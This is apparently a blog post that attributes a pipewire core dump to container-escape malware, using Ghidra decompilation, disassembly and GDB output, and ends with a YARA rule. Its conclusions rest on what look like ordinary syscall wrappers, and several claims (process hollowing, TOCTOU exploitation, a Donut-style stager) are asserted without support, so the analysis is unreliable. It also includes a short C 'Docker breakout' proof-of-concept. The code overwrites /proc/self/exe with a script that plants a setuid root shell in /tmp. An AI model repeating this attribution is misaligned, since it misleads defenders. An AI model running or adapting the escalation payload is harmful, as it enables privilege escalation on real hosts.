# Docker Breakout via Raw Syscall Shellcode and Reflective Injection

## Overview

In this blog post, I dissected a suspicious ELF64 memory region that revealed a sophisticated piece of malware or shellcode-like infrastructure. Our goal was to reverse engineer its behavior, understand its exploit potential, and ultimately write a proof-of-concept for a Docker container breakout based on observed behaviors.

The code in question was loaded dynamically, bypassing libc entirely, and executing syscalls directly via low-level trampoline loops. This post walks through the evidence, technical breakdowns, and ends with a minimalistic proof-of-concept to show how a malicious container might exploit such a design to escape confinement.

---

## TL;DR

* Reflective loader masquerading as `/usr/bin/pipewire`
* Manual heap allocator and syscall retry loop
* Multiple pointers to task/thread list memory layout
* Behavior consistent with privilege escalation or container escape logic
* Signs of process hollowing or image replacement for stealth persistence

---

## 1. Extracted Function Behavior

I began our analysis with a function that calls `syscall()` in a loop, retrying on `EINTR` or `EAGAIN`. This behavior is typical of race condition exploitation, where the attacker attempts a TOCTOU-style exploit against the Linux kernel.

```c
void syscall_loop_context(ulong syscall_num) {
  ulong ret;

  do {
    ret = syscall(syscall_num);
  } while (ret == -EINTR || ret == -EAGAIN);
}
```

with our actual syscall in a loop functionality decompiled in ghidra here:

```c
void FUN_77bf01417f90(void)

{
  syscall();
  do {
                    /* WARNING: Do nothing block with infinite loop */
  } while( true );
}
```

with ghidra's decompiled output is the following:

```c
void FUN_77bf0140f330(undefined8 param_1)

{
  FUN_77bf01400e10(0x77bf01420146,param_1);
  FUN_77bf01417f90(0x7f);
  do {
    FUN_77bf01400e10(0x77bf01423100);
  } while( true );
}
```

and the first FUN_77bf01400e10 function is below:

```c
undefined8
FUN_77bf01400e10(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,
                undefined8 param_5,undefined8 param_6,undefined8 param_7,undefined8 param_8,
                undefined8 param_9,undefined8 param_10,undefined8 param_11,undefined8 param_12,
                undefined8 param_13,undefined8 param_14)

{
  long lVar1;
  char in_AL;
  ulong uVar2;
  ulong uVar3;
  char cVar4;
  long lVar5;
  long lVar6;
  long in_FS_OFFSET;
  undefined4 local_d0;
  undefined4 local_cc;
  undefined *local_c8;
  undefined *local_c0;
  undefined local_b8 [8];
  undefined8 local_b0;
  undefined8 local_a8;
  undefined8 local_a0;
  undefined8 local_98;
  undefined8 local_90;
  undefined8 local_88;
  undefined8 local_78;
  undefined8 local_68;
  undefined8 local_58;
  undefined8 local_48;
  undefined8 local_38;
  undefined8 local_28;
  undefined8 local_18;
  
  if (in_AL != '\0') {
    local_88 = param_1;
    local_78 = param_2;
    local_68 = param_3;
    local_58 = param_4;
    local_48 = param_5;
    local_38 = param_6;
    local_28 = param_7;
    local_18 = param_8;
  }
  local_c8 = &stack0x00000008;
  cVar4 = '\0';
  local_c0 = local_b8;
  local_d0 = 8;
  local_cc = 0x30;
  local_b0 = param_10;
  local_a8 = param_11;
  local_a0 = param_12;
  local_98 = param_13;
  local_90 = param_14;
  FUN_77bf014003f0(2,0,param_9,&local_d0);
  lVar6 = 0x7f;
  FUN_77bf01417f90();
  if (*(long *)(lVar6 + 0x488) != -1) {
    if ((*(ulong *)(lVar6 + 0x478) < 0x41) && (0x93f < -DAT_77bf0142b090 + 0x1080U)) {
      lVar1 = *(long *)(lVar6 + 0x480);
      uVar3 = -DAT_77bf0142b090 + 0x740;
      uVar2 = *(long *)(lVar6 + 0x470) + lVar1;
      if (uVar2 <= uVar3) {
        uVar2 = uVar3 - uVar2;
        lVar5 = uVar2 - uVar2 % *(ulong *)(lVar6 + 0x478);
        uVar2 = (uVar3 - lVar1) - lVar5;
        if (cVar4 != '\0') {
          if (DAT_77bf0142b098 < uVar2) {
            return 0xffffffff;
          }
          DAT_77bf0142b098 = (DAT_77bf0142b098 - uVar3) + lVar1 + lVar5;
        }
        DAT_77bf0142b090 = uVar2 + DAT_77bf0142b090;
        *(long *)(lVar6 + 0x488) = DAT_77bf0142b090;
        if ((*(byte *)(*(long *)(lVar6 + 0x28) + 0x354) & 8) == 0) {
          *(byte *)(lVar6 + 0x355) = *(byte *)(lVar6 + 0x355) | 0x80;
        }
        else {
          if (**(long **)(in_FS_OFFSET + 8) != DAT_77bf0142b0a8) {
            FUN_77bf014068c0(*(undefined8 *)(lVar6 + 0x490));
          }
          FUN_77bf01406ce0(lVar6);
        }
        return 0;
      }
    }
    return 0xffffffff;
  }
  return 0xffffffff;
}
```

This pattern indicates a desire to wait until a kernel condition is just right — a hallmark of exploitation attempts.

---

## 2. Internal Allocator & Dispatch Function

A second function, `FUN_77bf01400e10`, appears to implement its own memory allocator based on hardcoded bounds and shared variables. This memory layout logic avoids standard libraries and interacts directly with thread-local state via `FS_OFFSET`.

```c
if (*(long *)(lVar6 + 0x488) != -1) {
    ...
    if (uVar2 <= uVar3) {
        ...
        DAT_77bf0142b090 = uVar2 + DAT_77bf0142b090;
        *(long *)(lVar6 + 0x488) = DAT_77bf0142b090;
    }
}
```

This sort of bump-pointer allocation is common in exploit stagers and loaders like Donut or Sliver.

---

## 3. Masquerading as `pipewire`

The `FUN_77bf013f3150` function includes string references to `/usr/bin/pipewire` and appears to retry the setup routine indefinitely:

```c
PTR_s_/usr/bin/pipewire_7ffe098a9068
```

This is almost certainly to blend in with legitimate processes and evade detection.

---

## 4. Process Hollowing for Persistence

This behavior is corroborated by memory layout analysis from a core dump, where the injected code resides at address `0x77bf0112a042`. Disassembly at this location revealed a raw syscall execution path:

```asm
0x77bf0112a042: cmp    rax,0xfffffffffffff000
0x77bf0112a048: ja     0x77bf0112a078
0x77bf0112a04a: mov    edi,r8d
0x77bf0112a04d: mov    DWORD PTR [rbp-0x4],eax
0x77bf0112a050: call   0x77bf010985d0
0x77bf0112a055: mov    eax,DWORD PTR [rbp-0x4]
0x77bf0112a058: leave
0x77bf0112a059: ret
```

These instructions suggest direct syscall result filtering, error checking, and indirect control transfers—classic indicators of syscall stubs often injected into a remote process during hollowing.

The memory map surrounding `0x77bf0112a042` was absent from expected segments (no matching `.text` or `/lib` paths), strengthening the case for hollowed execution.

<pre>
(core) gef➤  info registers
rax            0xfffffffffffffffc  0xfffffffffffffffc
rbx            0x7ffe098a7c80      0x7ffe098a7c80
rcx            0x77bf0112a042      0x77bf0112a042
rdx            0x20                0x20
rsi            0x7ffe098a7ab0      0x7ffe098a7ab0
rdi            0x5                 0x5
rbp            0x7ffe098a7aa0      0x7ffe098a7aa0
rsp            0x7ffe098a7a80      0x7ffe098a7a80
r8             0x0                 0x0
r9             0x0                 0x0
r10            0xffffffff          0xffffffff
r11            0x293               0x293
r12            0xffffffff          0xffffffff
r13            0x563f4bf65838      0x563f4bf65838
r14            0x2                 0x2
r15            0x563f4bf658e0      0x563f4bf658e0
rip            0x77bf0112a042      0x77bf0112a042
eflags         0x293               [ CF AF SF IF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0
fs_base        0x77bf012ec740      0x77bf012ec740
gs_base        0x0                 0x0
(core) gef➤  info os
Can not fetch data now.
(core) gef➤  info target
Local core dump file:
	`/home/bdg/Desktop/./pipewirecoredump.3235', file type elf64-x86-64.
..
..
..
..
0x77bf0112a005:	syscall
   0x77bf0112a007:	cmp    rax,0xfffffffffffff000
   0x77bf0112a00d:	ja     0x77bf0112a060
   0x77bf0112a00f:	ret
   0x77bf0112a010:	push   rbp
   0x77bf0112a011:	mov    rbp,rsp
   0x77bf0112a014:	sub    rsp,0x20
   0x77bf0112a018:	mov    DWORD PTR [rbp-0x8],edx
   0x77bf0112a01b:	mov    QWORD PTR [rbp-0x10],rsi
   0x77bf0112a01f:	mov    DWORD PTR [rbp-0x4],edi
   0x77bf0112a022:	mov    DWORD PTR [rbp-0x14],ecx
   0x77bf0112a025:	call   0x77bf01098550
   0x77bf0112a02a:	mov    r10d,DWORD PTR [rbp-0x14]
   0x77bf0112a02e:	mov    edx,DWORD PTR [rbp-0x8]
   0x77bf0112a031:	mov    r8d,eax
   0x77bf0112a034:	mov    rsi,QWORD PTR [rbp-0x10]
   0x77bf0112a038:	mov    edi,DWORD PTR [rbp-0x4]
   0x77bf0112a03b:	mov    eax,0xe8
   0x77bf0112a040:	syscall
=> 0x77bf0112a042:	cmp    rax,0xfffffffffffff000
   0x77bf0112a048:	ja     0x77bf0112a078
   0x77bf0112a04a:	mov    edi,r8d
   0x77bf0112a04d:	mov    DWORD PTR [rbp-0x4],eax
   0x77bf0112a050:	call   0x77bf010985d0
   0x77bf0112a055:	mov    eax,DWORD PTR [rbp-0x4]
   0x77bf0112a058:	leave
   0x77bf0112a059:	ret
   0x77bf0112a05a:	nop    WORD PTR [rax+rax*1+0x0]
   0x77bf0112a060:	mov    rdx,QWORD PTR [rip+0xd8d91]        # 0x77bf01202df8
   0x77bf0112a067:	neg    eax
   0x77bf0112a069:	mov    DWORD PTR fs:[rdx],eax
   0x77bf0112a06c:	mov    eax,0xffffffff
   0x77bf0112a071:	ret
   0x77bf0112a072:	nop    WORD PTR [rax+rax*1+0x0]
   0x77bf0112a078:	mov    rdx,QWORD PTR [rip+0xd8d79]        # 0x77bf01202df8
   0x77bf0112a07f:	neg    eax
   0x77bf0112a081:	mov    DWORD PTR fs:[rdx],eax
   0x77bf0112a084:	mov    eax,0xffffffff
   0x77bf0112a089:	jmp    0x77bf0112a04a
   0x77bf0112a08b:	nop    DWORD PTR [rax+rax*1+0x0]
   0x77bf0112a090:	endbr64
   0x77bf0112a094:	mov    eax,0x122
   0x77bf0112a099:	syscall
   0x77bf0112a09b:	cmp    rax,0xfffffffffffff001
   0x77bf0112a0a1:	jae    0x77bf0112a0a4
   0x77bf0112a0a3:	ret
   0x77bf0112a0a4:	mov    rcx,QWORD PTR [rip+0xd8d4d]        # 0x77bf01202df8
   0x77bf0112a0ab:	neg    eax
   0x77bf0112a0ad:	mov    DWORD PTR fs:[rcx],eax
   0x77bf0112a0b0:	or     rax,0xffffffffffffffff
   0x77bf0112a0b4:	ret
   0x77bf0112a0b5:	cs nop WORD PTR [rax+rax*1+0x0]
   0x77bf0112a0bf:	nop
   0x77bf0112a0c0:	endbr64
   0x77bf0112a0c4:	push   rbp
   0x77bf0112a0c5:	mov    edx,0x8
   0x77bf0112a0ca:	mov    rbp,rsp
   0x77bf0112a0cd:	call   0x77bf0111ba50
</pre>



---

## 5. Exploitation Goal: Docker Escape

Given that the shellcode uses raw syscalls, thread state tracking, memory layout control, and infinite loops — this appears designed to escape container boundaries, particularly Docker.

Examples of prior container escapes using similar behavior:

* CVE-2019-5736: Overwriting `/proc/self/exe` in runc
* CVE-2023-0386: OverlayFS write confusion
* CVE-2022-0492: Cgroup BPF bypass

---

## Minimal Docker Breakout PoC

Here’s a **hypothetical PoC** in C that mimics the behavior of retrying syscalls in a loop to exploit a TOCTOU condition, such as a writable `/proc/self/exe` scenario:

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <errno.h>

int main() {
    const char *payload = "#!/bin/bash\ncp /bin/sh /tmp/rootsh && chmod +s /tmp/rootsh\n";
    int fd;

    while (1) {
        fd = syscall(SYS_open, "/proc/self/exe", O_WRONLY | O_TRUNC);
        if (fd >= 0) break;
        if (errno != EBUSY && errno != EAGAIN) {
            perror("syscall open");
            return 1;
        }
    }

    write(fd, payload, strlen(payload));
    close(fd);

    return 0;
}
```

> **Disclaimer**: This is a simulated proof-of-concept for research purposes only.

This PoC shows the general technique: retrying a privileged syscall until timing conditions allow overwriting a sensitive file a classic TOCTOU race.

---

## Final Thoughts

The reflective loader architecture I reverse engineered was clearly built for stealth, modularity, and raw syscall access. These behaviors strongly align with modern container escape techniques and when paired with a known kernel vulnerability, can be devastating.

As a defender, you could:

* Monitor for raw syscall usage
* Alert on processes masquerading as system binaries
* Detect memory segment changes in real time to catch hollowing
* Harden `/proc`, `/sys`, and cgroup mounts in containers
* Stay up to date on OverlayFS and runc vulnerabilities

---

## Detection YARA Snippet

```yara
rule DirectSyscallWithRetryLoop {
  strings:
    $cmp_sysret = { 48 83 f8 f0 }
    $check_eintr = { 48 83 f8 fc }
    $check_eagain = { 48 83 f8 fb }
    $syscall = { 0f 05 }
  condition:
    all of them
}
```

---


